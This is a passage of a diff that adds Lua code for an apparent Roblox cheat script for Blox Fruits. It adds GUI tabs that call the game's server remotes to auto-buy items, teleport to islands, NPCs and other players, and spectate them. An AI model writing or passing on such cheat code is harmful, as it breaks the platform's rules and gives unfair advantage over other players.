+        _G.Settings.Shop["Auto Buy Legendary Sword"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Shop["Auto Buy Legendary Sword"] then
+            pcall(function()
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LegendarySwordDealer", "1");
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LegendarySwordDealer", "2");
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LegendarySwordDealer", "3");
+            end);
+        end
+    end
+end);
+AutoBuyHakiColorToggle = Tabs.ShopTab:Toggle({
+    Title = "Auto Buy Haki Color",
+    Value = _G.Settings.Shop["Auto Buy Haki Color"],
+    Callback = function(state)
+        _G.Settings.Shop["Auto Buy Haki Color"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Shop["Auto Buy Haki Color"] then
+            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ColorsDealer", "2");
+        end
+    end
+end);
+AbilitiesShopSection = Tabs.ShopTab:Section({
+    Title = "Abilities",
+    TextXAlignment = "Left"
+});
+BuyGeppoButton = Tabs.ShopTab:Button({
+    Title = "Buy Geppo",
+    Desc = "$10,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Geppo");
+    end
+});
+BuyBusoHaki = Tabs.ShopTab:Button({
+    Title = "Buy Buso Haki",
+    Desc = "$25,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Buso");
+    end
+});
+BuySoruButton = Tabs.ShopTab:Button({
+    Title = "Buy Soru",
+    Desc = "$25,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Soru");
+    end
+});
+BuyObservationHakiButton = Tabs.ShopTab:Button({
+    Title = "Buy Observation Haki",
+    Desc = "$750,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KenTalk", "Buy");
+    end
+});
+FightingStyleShopSection = Tabs.ShopTab:Section({
+    Title = "Fighting Style",
+    TextXAlignment = "Left"
+});
+BuyBlackLegButton = Tabs.ShopTab:Button({
+    Title = "Buy Black Leg",
+    Desc = "$150,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+    end
+});
+BuyElectroButton = Tabs.ShopTab:Button({
+    Title = "Buy Electro",
+    Desc = "$550,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+    end
+});
+BuyFishmanKarateButton = Tabs.ShopTab:Button({
+    Title = "Buy Fishman Karate",
+    Desc = "$750,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+    end
+});
+BuyDragonClawButton = Tabs.ShopTab:Button({
+    Title = "Buy Dragon Claw",
+    Desc = "F’1,500",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1");
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+    end
+});
+BuySuperhumanButton = Tabs.ShopTab:Button({
+    Title = "Buy Superhuman",
+    Desc = "$3,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+    end
+});
+BuyDeathStepButton = Tabs.ShopTab:Button({
+    Title = "Buy Death Step",
+    Desc = "F’5,000 $5,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+    end
+});
+BuySharkmanKarateButton = Tabs.ShopTab:Button({
+    Title = "Buy Sharkman Karate",
+    Desc = "F’5,000 $2,500,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate", true);
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+    end
+});
+BuyElectricClawButton = Tabs.ShopTab:Button({
+    Title = "Buy Electric Claw",
+    Desc = "F’5,000 $3,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+    end
+});
+BuyDragonTalonButton = Tabs.ShopTab:Button({
+    Title = "Buy Dragon Talon",
+    Desc = "F’5,000 $3,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+    end
+});
+BuyGodHumanButton = Tabs.ShopTab:Button({
+    Title = "Buy God Human",
+    Desc = "F’5,000 $5,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyGodhuman");
+    end
+});
+BuySanguineArtButton = Tabs.ShopTab:Button({
+    Title = "Buy Sanguine Art",
+    Desc = "F’5,000 $5,000,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySanguineArt", true);
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySanguineArt");
+    end
+});
+SwordShopSection = Tabs.ShopTab:Section({
+    Title = "Sword",
+    TextXAlignment = "Left"
+});
+BuyCutlassButton = Tabs.ShopTab:Button({
+    Title = "Buy Cutlass",
+    Desc = "$1,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Cutlass");
+    end
+});
+BuyKatanaButton = Tabs.ShopTab:Button({
+    Title = "Buy Katana",
+    Desc = "$1,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Katana");
+    end
+});
+BuyIronMaceButton = Tabs.ShopTab:Button({
+    Title = "Buy Iron Mace",
+    Desc = "$25,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace");
+    end
+});
+BuyDualKatanaButton = Tabs.ShopTab:Button({
+    Title = "Buy Dual Katana",
+    Desc = "$12,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Dual Katana");
+    end
+});
+BuyTripleKatanaButton = Tabs.ShopTab:Button({
+    Title = "Buy Triple Katana",
+    Desc = "$60,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana");
+    end
+});
+BuyPipeButton = Tabs.ShopTab:Button({
+    Title = "Buy Pipe",
+    Desc = "$100,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Pipe");
+    end
+});
+BuyDualHeadedBladeButton = Tabs.ShopTab:Button({
+    Title = "Buy Dual Headed Blade",
+    Desc = "$400,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade");
+    end
+});
+BuyBisentoButton = Tabs.ShopTab:Button({
+    Title = "Buy Bisento",
+    Desc = "$1,200,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Bisento");
+    end
+});
+BuySoulCaneButton = Tabs.ShopTab:Button({
+    Title = "Buy Soul Cane",
+    Desc = "$1,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane");
+    end
+});
+GunShopSection = Tabs.ShopTab:Section({
+    Title = "Gun",
+    TextXAlignment = "Left"
+});
+BuySlingshotButton = Tabs.ShopTab:Button({
+    Title = "Buy Slingshot",
+    Desc = "$5,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Slingshot");
+    end
+});
+BuyMusketButton = Tabs.ShopTab:Button({
+    Title = "Buy Musket",
+    Desc = "$8,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Musket");
+    end
+});
+BuyFintlockButton = Tabs.ShopTab:Button({
+    Title = "Buy Flintlock",
+    Desc = "$10,500",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Flintlock");
+    end
+});
+BuyRefinedFintlockButton = Tabs.ShopTab:Button({
+    Title = "Buy Refined Fintlock",
+    Desc = "$60,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Refined Fintlock");
+    end
+});
+BuyCanonButton = Tabs.ShopTab:Button({
+    Title = "Buy Cannon",
+    Desc = "$100,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Cannon");
+    end
+});
+BuyKabuchaButton = Tabs.ShopTab:Button({
+    Title = "Buy Kabucha",
+    Desc = "F’1,500",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "1");
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "2");
+    end
+});
+StatsShopSection = Tabs.ShopTab:Section({
+    Title = "Stats",
+    TextXAlignment = "Left"
+});
+ResetStatsShopButton = Tabs.ShopTab:Button({
+    Title = "Reset Stats",
+    Desc = "F’2,500",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "1");
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2");
+    end
+});
+RandomRaceShopButton = Tabs.ShopTab:Button({
+    Title = "Random Race",
+    Desc = "F’3,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "1");
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2");
+    end
+});
+AccessoriesShopSection = Tabs.ShopTab:Section({
+    Title = "Accessories",
+    TextXAlignment = "Left"
+});
+BuyBlackCapeButton = Tabs.ShopTab:Button({
+    Title = "Buy Black Cape",
+    Desc = "$50,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Black Cape");
+    end
+});
+BuySwordsmanHatButton = Tabs.ShopTab:Button({
+    Title = "Buy Swordsman Hat",
+    Desc = "$150,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Swordsman Hat");
+    end
+});
+BuyTomoeRingButton = Tabs.ShopTab:Button({
+    Title = "Buy Tomoe Ring",
+    Desc = "$500,000",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Tomoe Ring");
+    end
+});
+CombatTabSection = Tabs.CombatTab:Section({
+    Title = "Combat",
+    TextXAlignment = "Left"
+});
+PlayerInServerTotalParagraph = Tabs.CombatTab:Paragraph({
+    Title = "Players In Server",
+    Desc = "0"
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            for i, v in pairs((game:GetService("Players")):GetPlayers()) do
+                if i == 12 then
+                    PlayerInServerTotalParagraph:SetDesc(i .. " / " .. "12" .. "(Max)");
+                elseif i == 1 then
+                    PlayerInServerTotalParagraph:SetDesc(i .. " / " .. "12");
+                else
+                    PlayerInServerTotalParagraph:SetDesc(i .. " / " .. "12");
+                end
+            end
+        end);
+    end
+end);
+local PlayerList = {};
+for i, v in pairs((game:GetService("Players")):GetChildren()) do
+    table.insert(PlayerList, v.Name);
+end
+SelectedPlayerDropdown = Tabs.CombatTab:Dropdown({
+    Title = "Choose Player",
+    Values = PlayerList,
+    Value = tostring(PlayerList[1]),
+    Callback = function(option)
+        _G.SelectedPlayer = option;
+    end
+});
+RefreshPlayerButton = Tabs.CombatTab:Button({
+    Title = "Refresh Player",
+    Callback = function()
+        PlayerList = {};
+        for i, v in pairs((game:GetService("Players")):GetChildren()) do
+            table.insert(PlayerList, v.Name);
+        end
+        SelectedPlayerDropdown:Refresh(PlayerList);
+    end
+});
+SpectatePlayerToggle = Tabs.CombatTab:Toggle({
+    Title = "Spectate Player",
+    Value = false,
+    Callback = function(state)
+        SpectatePlys = state;
+        repeat
+            wait(0.1);
+            (game:GetService("Workspace")).Camera.CameraSubject =
+                ((game:GetService("Players")):FindFirstChild(_G.SelectedPlayer)).Character.Humanoid;
+        until SpectatePlys == false or (not (game:GetService("Players")):FindFirstChild(_G.SelectedPlayer));
+        (game:GetService("Workspace")).Camera.CameraSubject =
+            (game:GetService("Players")).LocalPlayer.Character.Humanoid;
+    end
+});
+TeleportToPlayerToggle = Tabs.CombatTab:Toggle({
+    Title = "Teleport To Player",
+    Value = false,
+    Callback = function(state)
+        _G.TeleportToPlayer = value;
+        pcall(function()
+            if _G.TeleportToPlayer then
+                repeat
+                    TweenPlayer((game:GetService("Players"))[_G.SelectedPlayer].Character.HumanoidRootPart.CFrame);
+                    wait();
+                until _G.TeleportToPlayer == false or
+                    (not (game:GetService("Players")):FindFirstChild(_G.SelectedPlayer));
+            end
+            StopTween(_G.TeleportToPlayer);
+        end);
+    end
+});
+local IslandList = {};
+if World1 then
+    IslandList = {"WindMill", "Marine", "Middle Town", "Jungle", "Pirate Village", "Desert", "Snow Island",
+                  "MarineFord", "Colosseum", "Sky Island 1", "Sky Island 2", "Sky Island 3", "Prison", "Magma Village",
+                  "Under Water Island", "Fountain City", "Shank Room", "Mob Island"};
+elseif World2 then
+    IslandList = {"The Cafe", "Frist Spot", "Dark Area", "Flamingo Mansion", "Flamingo Room", "Green Zone", "Factory",
+                  "Colossuim", "Zombie Island", "Two Snow Mountain", "Punk Hazard", "Cursed Ship", "Ice Castle",
+                  "Forgotten Island", "Ussop Island", "Mini Sky Island"};
+elseif World3 then
+    IslandList = {"Mansion", "Port Town", "Great Tree", "Castle On The Sea", "MiniSky", "Hydra Island",
+                  "Floating Turtle", "Haunted Castle", "Ice Cream Island", "Peanut Island", "Cake Island",
+                  "Cocoa Island", "Candy Island", "Tiki Outpost", "Dragon Dojo"};
+end
+SelectedTeleportIslandDropdown = Tabs.TeleportTab:Dropdown({
+    Title = "Choose Island",
+    Values = IslandList,
+    Value = IslandList[1],
+    Callback = function(option)
+        _G.SelectIsland = option;
+    end
+});
+AutoTeleportToIslandToggle = Tabs.TeleportTab:Toggle({
+    Title = "Teleport To Island",
+    Value = false,
+    Callback = function(state)
+        _G.TeleportIsland = state;
+        if _G.TeleportIsland then
+            repeat
+                wait();
+                if _G.SelectIsland == "WindMill" then
+                    TweenPlayer(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594));
+                elseif _G.SelectIsland == "Marine" then
+                    TweenPlayer(CFrame.new(-2566.4296875, 6.8556680679321, 2045.2561035156));
+                elseif _G.SelectIsland == "Middle Town" then
+                    TweenPlayer(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094));
+                elseif _G.SelectIsland == "Jungle" then
+                    TweenPlayer(CFrame.new(-1612.7957763672, 36.852081298828, 149.12843322754));
+                elseif _G.SelectIsland == "Pirate Village" then
+                    TweenPlayer(CFrame.new(-1181.3093261719, 4.7514905929565, 3803.5456542969));
+                elseif _G.SelectIsland == "Desert" then
+                    TweenPlayer(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688));
+                elseif _G.SelectIsland == "Snow Island" then
+                    TweenPlayer(CFrame.new(1347.8067626953, 104.66806030273, -1319.7370605469));
+                elseif _G.SelectIsland == "MarineFord" then
+                    TweenPlayer(CFrame.new(-4914.8212890625, 50.963626861572, 4281.0278320313));
+                elseif _G.SelectIsland == "Colosseum" then
+                    TweenPlayer(CFrame.new(-1427.6203613281, 7.2881078720093, -2792.7722167969));
+                elseif _G.SelectIsland == "Sky Island 1" then
+                    TweenPlayer(CFrame.new(-4869.1025390625, 733.46051025391, -2667.0180664063));
+                elseif _G.SelectIsland == "Sky Island 2" then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                        -4607.82275, 872.54248, -1667.55688));
+                elseif _G.SelectIsland == "Sky Island 3" then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                        -7894.6176757813, 5547.1416015625, -380.29119873047));
+                elseif _G.SelectIsland == "Prison" then
+                    TweenPlayer(CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656));
+                elseif _G.SelectIsland == "Magma Village" then
+                    TweenPlayer(CFrame.new(-5247.7163085938, 12.883934020996, 8504.96875));
+                elseif _G.SelectIsland == "Under Water Island" then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                        61163.8515625, 11.6796875, 1819.7841796875));
+                elseif _G.SelectIsland == "Fountain City" then
+                    TweenPlayer(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813));
+                elseif _G.SelectIsland == "Shank Room" then
+                    TweenPlayer(CFrame.new(-1442.16553, 29.8788261, -28.3547478));
+                elseif _G.SelectIsland == "Mob Island" then
+                    TweenPlayer(CFrame.new(-2850.20068, 7.39224768, 5354.99268));
+                elseif _G.SelectIsland == "The Cafe" then
+                    TweenPlayer(CFrame.new(-380.47927856445, 77.220390319824, 255.82550048828));
+                elseif _G.SelectIsland == "Frist Spot" then
+                    TweenPlayer(CFrame.new(-11.311455726624, 29.276733398438, 2771.5224609375));
+                elseif _G.SelectIsland == "Dark Area" then
+                    TweenPlayer(CFrame.new(3780.0302734375, 22.652164459229, -3498.5859375));
+                elseif _G.SelectIsland == "Flamingo Mansion" then
+                    TweenPlayer(CFrame.new(-483.73370361328, 332.0383605957, 595.32708740234));
+                elseif _G.SelectIsland == "Flamingo Room" then
+                    TweenPlayer(CFrame.new(2284.4140625, 15.152037620544, 875.72534179688));
+                elseif _G.SelectIsland == "Green Zone" then
+                    TweenPlayer(CFrame.new(-2448.5300292969, 73.016105651855, -3210.6306152344));
+                elseif _G.SelectIsland == "Factory" then
+                    TweenPlayer(CFrame.new(424.12698364258, 211.16171264648, -427.54049682617));
+                elseif _G.SelectIsland == "Colossuim" then
+                    TweenPlayer(CFrame.new(-1503.6224365234, 219.7956237793, 1369.3101806641));
+                elseif _G.SelectIsland == "Zombie Island" then
+                    TweenPlayer(CFrame.new(-5622.033203125, 492.19604492188, -781.78552246094));
+                elseif _G.SelectIsland == "Two Snow Mountain" then
+                    TweenPlayer(CFrame.new(753.14288330078, 408.23559570313, -5274.6147460938));
+                elseif _G.SelectIsland == "Punk Hazard" then
+                    TweenPlayer(CFrame.new(-6127.654296875, 15.951762199402, -5040.2861328125));
+                elseif _G.SelectIsland == "Cursed Ship" then
+                    TweenPlayer(CFrame.new(923.40197753906, 125.05712890625, 32885.875));
+                elseif _G.SelectIsland == "Ice Castle" then
+                    TweenPlayer(CFrame.new(6148.4116210938, 294.38687133789, -6741.1166992188));
+                elseif _G.SelectIsland == "Forgotten Island" then
+                    TweenPlayer(CFrame.new(-3032.7641601563, 317.89672851563, -10075.373046875));
+                elseif _G.SelectIsland == "Ussop Island" then
+                    TweenPlayer(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781));
+                elseif _G.SelectIsland == "Mini Sky Island" then
+                    TweenPlayer(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375));
+                elseif _G.SelectIsland == "Great Tree" then
+                    TweenPlayer(CFrame.new(2681.2736816406, 1682.8092041016, -7190.9853515625));
+                elseif _G.SelectIsland == "Castle On The Sea" then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                        -5083.26025390625, 314.6056823730469, -3175.673095703125));
+                elseif _G.SelectIsland == "MiniSky" then
+                    TweenPlayer(CFrame.new(-260.65557861328, 49325.8046875, -35253.5703125));
+                elseif _G.SelectIsland == "Port Town" then
+                    TweenPlayer(CFrame.new(-290.7376708984375, 6.729952812194824, 5343.5537109375));
+                elseif _G.SelectIsland == "Hydra Island" then
+                    TweenPlayer(CFrame.new(5291.24951, 1005.4433, 393.762421, 0.994222522, 0.00000000945717726,
+                        -0.10733854, -0.00000000708227299, 1, 0.0000000225065655, 0.10733854, -0.0000000216163336,
+                        0.994222522));
+                elseif _G.SelectIsland == "Floating Turtle" then
+                    TweenPlayer(CFrame.new(-13274.528320313, 531.82073974609, -7579.22265625));
+                elseif _G.SelectIsland == "Mansion" then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(
+                        -12471.169921875, 374.94024658203, -7551.677734375));
+                elseif _G.SelectIsland == "Haunted Castle" then
+                    TweenPlayer(CFrame.new(-9515.3720703125, 164.00624084473, 5786.0610351562));
+                elseif _G.SelectIsland == "Ice Cream Island" then
+                    TweenPlayer(CFrame.new(-902.56817626953, 79.93204498291, -10988.84765625));
+                elseif _G.SelectIsland == "Peanut Island" then
+                    TweenPlayer(CFrame.new(-2062.7475585938, 50.473892211914, -10232.568359375));
+                elseif _G.SelectIsland == "Cake Island" then
+                    TweenPlayer(CFrame.new(-1884.7747802734375, 19.327526092529297, -11666.8974609375));
+                elseif _G.SelectIsland == "Cocoa Island" then
+                    TweenPlayer(CFrame.new(87.94276428222656, 73.55451202392578, -12319.46484375));
+                elseif _G.SelectIsland == "Candy Island" then
+                    TweenPlayer(CFrame.new(-1014.4241943359375, 149.11068725585938, -14555.962890625));
+                elseif _G.SelectIsland == "Tiki Outpost" then
+                    TweenPlayer(CFrame.new(-16218.6826, 9.08636189, 445.618408, -0.0610186495, 0.00000000110512588,
+                        -0.99813664, -0.0000000183458475, 1, 0.00000000222871765, 0.99813664, 0.0000000184476558,
+                        -0.0610186495));
+                elseif _G.SelectIsland == "Dragon Dojo" then
+                    TweenPlayer(CFrame.new(5743.31934, 1206.90991, 936.011047, 0.475779682, -0.00000000366404773,
+                        -0.879564524, 0.0000000254969592, 1, 0.00000000962622693, 0.879564524, -0.000000027006184,
+                        0.475779682));
+                end
+            until not _G.TeleportIsland;
+        end
+        StopTween(_G.TeleportIsland);
+    end
+});
+TeleportNpcSection = Tabs.TeleportTab:Section({
+    Title = "Npc",
+    TextXAlignment = "Left"
+});
+local NpcList = {};
+if World1 then
+    NpcList = {"Random Devil Fruit", "Blox Fruits Dealer", "Remove Devil Fruit", "Ability Teacher", "Dark Step",
+               "Electro", "Fishman Karate"};
+elseif World2 then
+    NpcList = {"Dargon Berath", "Mtsterious Man", "Mysterious Scientist", "Awakening Expert", "Nerd", "Bar Manager",
+               "Blox Fruits Dealer", "Trevor", "Enhancement Editor", "Pirate Recruiter", "Marines Recruiter", "Chemist",
+               "Cyborg", "Ghoul Mark", "Guashiem", "El Admin", "El Rodolfo", "Arowe"};
+elseif World3 then
+    NpcList = {"Blox Fruits Dealer", "Remove Devil Fruit", "Horned Man", "Hungey Man", "Previous Hero", "Butler",
+               "Lunoven", "Trevor", "Elite Hunter", "Player Hunter", "Uzoth"};
+end
+SelectedNpcTeleport = Tabs.TeleportTab:Dropdown({
+    Title = "Choose Npc",
+    Values = NpcList,
+    Value = NpcList[1],
+    Callback = function(option)
+        _G.SelectNPC = option;
+    end
+});
+TeleportToNpcToggle = Tabs.TeleportTab:Toggle({
+    Title = "Teleport To Npc",
+    Value = false,
+    Callback = function(state)
+        _G.TeleportNPC = state;
+        if _G.TeleportNPC then
+            repeat
+                wait();
+                if _G.SelectNPC == "Dargon Berath" then
+                    TweenPlayer(CFrame.new(703.372986, 186.985519, 654.522034, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Mtsterious Man" then
+                    TweenPlayer(CFrame.new(-2574.43335, 1627.92371, -3739.35767, 0.378697902, -0.00000000906400288,
+                        0.92552036, -0.00000000895582009, 1, 0.0000000134578926, -0.92552036, -0.0000000133852689,
+                        0.378697902));
+                elseif _G.SelectNPC == "Mysterious Scientist" then
+                    TweenPlayer(CFrame.new(-6437.87793, 250.645355, -4498.92773, 0.502376854, -0.0000000101223634,
+                        -0.864648759, 0.0000000234106086, 1, 0.00000000189508653, 0.864648759, -0.0000000211940012,
+                        0.502376854));
+                elseif _G.SelectNPC == "Awakening Expert" then
+                    TweenPlayer(CFrame.new(-408.098846, 16.0459061, 247.432846, 0.028394036, 0.000000000617599138,
+                        0.999596894, -0.00000000557905944, 1, -0.000000000459372484, -0.999596894, -0.00000000556376767,
+                        0.028394036));
+                elseif _G.SelectNPC == "Nerd" then
+                    TweenPlayer(CFrame.new(-401.783722, 73.0859299, 262.306702, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Bar Manager" then
+                    TweenPlayer(CFrame.new(-385.84726, 73.0458984, 316.088806, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Blox Fruits Dealer" then
+                    TweenPlayer(CFrame.new(-450.725464, 73.0458984, 355.636902, -0.780352175, -0.000000027266168,
+                        0.625340283, 0.00000000978516468, 1, 0.0000000558128797, -0.625340283, 0.0000000496727601,
+                        -0.780352175));
+                elseif _G.SelectNPC == "Trevor" then
+                    TweenPlayer(CFrame.new(-341.498322, 331.886444, 643.024963, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Plokster" then
+                    TweenPlayer(CFrame.new(-1885.16016, 88.3838196, -1912.28723, -0.513468027, 0, 0.858108759, 0, 1, 0,
+                        -0.858108759, 0, -0.513468027));
+                elseif _G.SelectNPC == "Enhancement Editor" then
+                    TweenPlayer(CFrame.new(-346.820221, 72.9856339, 1194.36218, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Pirate Recruiter" then
+                    TweenPlayer(CFrame.new(-428.072998, 72.9495239, 1445.32422, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Marines Recruiter" then
+                    TweenPlayer(CFrame.new(-1349.77295, 72.9853363, -1045.12964, 0.866493046, 0, -0.499189168, 0, 1, 0,
+                        0.499189168, 0, 0.866493046));
+                elseif _G.SelectNPC == "Chemist" then
+                    TweenPlayer(CFrame.new(-2777.45288, 72.9919434, -3572.25732, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Ghoul Mark" then
+                    TweenPlayer(CFrame.new(635.172546, 125.976357, 33219.832, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Cyborg" then
+                    TweenPlayer(CFrame.new(629.146851, 312.307373, -531.624146, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Guashiem" then
+                    TweenPlayer(CFrame.new(937.953003, 181.083359, 33277.9297, 1, -0.0000000860126406,
+                        0.0000000000000000381773896, 0.0000000860126406, 1, -0.000000000000000189969598,
+                        -0.000000000000000038177373, 0.000000000000000189969598, 1));
+                elseif _G.SelectNPC == "El Admin" then
+                    TweenPlayer(CFrame.new(1322.80835, 126.345039, 33135.8789, 0.988783717, -0.0000000869797603,
+                        -0.149354503, 0.0000000862223786, 1, -0.0000000115461916, 0.149354503, -0.00000000146101409,
+                        0.988783717));
+                elseif _G.SelectNPC == "El Rodolfo" then
+                    TweenPlayer(CFrame.new(941.228699, 40.4686775, 32778.9922, -0.818029106, -0.0000000119524382,
+                        0.575176775, -0.0000000128741648, 1, 0.00000000247053866, -0.575176775, -0.00000000538394795,
+                        -0.818029106));
+                elseif _G.SelectNPC == "Arowe" then
+                    TweenPlayer(CFrame.new(-1994.51038, 125.519142, -72.2622986, -0.16715166, -0.0000000655417338,
+                        -0.985931218, -0.0000000713315558, 1, -0.0000000543836585, 0.985931218, 0.0000000612376851,
+                        -0.16715166));
+                elseif _G.SelectNPC == "Random Devil Fruit" then
+                    TweenPlayer(CFrame.new(-1436.19727, 61.8777695, 4.75247526, -0.557794094, 0.0000000274216543,
+                        0.829979479, 0.0000000583273234, 1, 0.00000000616037932, -0.829979479, 0.0000000518467118,
+                        -0.557794094));
+                elseif _G.SelectNPC == "Blox Fruits Dealer" then
+                    TweenPlayer(CFrame.new(-923.255066, 7.67800522, 1608.61011, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Remove Devil Fruit" then
+                    TweenPlayer(CFrame.new(5664.80469, 64.677681, 867.85907, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Ability Teacher" then
+                    TweenPlayer(CFrame.new(-1057.67822, 9.65220833, 1799.49146, -0.865874112, -0.0000000926330159,
+                        0.500262439, -0.0000000733759435, 1, 0.00000005816689, -0.500262439, 0.0000000136579752,
+                        -0.865874112));
+                elseif _G.SelectNPC == "Dark Step" then
+                    TweenPlayer(CFrame.new(-987.873047, 13.7778397, 3989.4978, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Electro" then
+                    TweenPlayer(CFrame.new(-5389.49561, 13.283, -2149.80151, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Fishman Karate" then
+                    TweenPlayer(CFrame.new(61581.8047, 18.8965912, 987.832703, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif _G.SelectNPC == "Random Devil Fruit" then
+                    TweenPlayer(CFrame.new(-12491, 337, -7449));
+                elseif _G.SelectNPC == "Blox Fruits Dealer" then
+                    TweenPlayer(CFrame.new(-12511, 337, -7448));
+                elseif _G.SelectNPC == "Remove Devil Fruit" then
